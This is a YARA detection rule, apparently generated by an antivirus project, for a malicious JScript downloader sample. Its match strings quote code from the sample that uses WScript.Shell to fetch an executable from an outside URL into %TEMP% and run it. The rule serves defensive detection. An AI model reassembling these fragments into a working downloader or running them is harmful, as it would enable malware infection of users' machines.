rule sig_20160328_f07b2538c7f1f2cee18b0c226055aa54 {
  meta:
    description = "datamaliciousorder - file 20160328_f07b2538c7f1f2cee18b0c226055aa54.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "db7726fe343e02ed5479af4569cb677875ade5c34ec8e9e16e84433fc21d45ee"

  strings:
    $s1  = "function Pohgqvpd() {return Jcitlbdvfe[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rf9hs0hT.exe\";};" fullword ascii
    $s2  = "do {WScript[Uhybid](Xgznutkt() * 11)} while (Qdrcxjrfe[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Elivjcw(Mnmfjsyd, Spkssrm){return Mnmfjsyd - Spkssrm;};" fullword ascii
    $s4  = "Qdrcxjrfe[Ydnebvdvp](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "var Jcitlbdvfe = function Wdhylot() {return WScript[Pwtcnz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Hmjseiq(Xaiouibyqj){Jcitlbdvfe[\"Run\"](Xaiouibyqj, Nlzokkmc, Nlzokkmc);};" fullword ascii
    $s7  = "function Hkbzsj() {return ((Vscqpim == true) && (Vscqpim == Ghopeia)) ? 1 : Nlzokkmc;};" fullword ascii
    $s8  = "return Elivjcw(Cqlomeex, Kwqsmhvr);" fullword ascii
    $s9  = "var Vscqpim = false;" fullword ascii
    $s10 = " while (Xujgvemal){" fullword ascii
    $s11 = "Vscqpim = true; " fullword ascii
    $s12 = "function Xgznutkt(){return 22;};" fullword ascii
    $s13 = "var Iommyn = new this[\"Date\"]();" fullword ascii
    $s14 = "var Ghopeia = false;" fullword ascii
    $s15 = "Ghopeia = true; " fullword ascii
    $s16 = "function Pbllaphojy(Vvualofag) {var Lmndgmcun = (1, 2, 3, 4, 5, Vvualofag); return Lmndgmcun;};" fullword ascii
    $s17 = "var Bmozjdsdjx = false;" fullword ascii
    $s18 = "function Tyazyqks(){return Pwtcnz;};" fullword ascii
    $s19 = "function Zhlkjenzpe(){return Yjtxoxq;};" fullword ascii
    $s20 = "function Zywjsuuiov()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}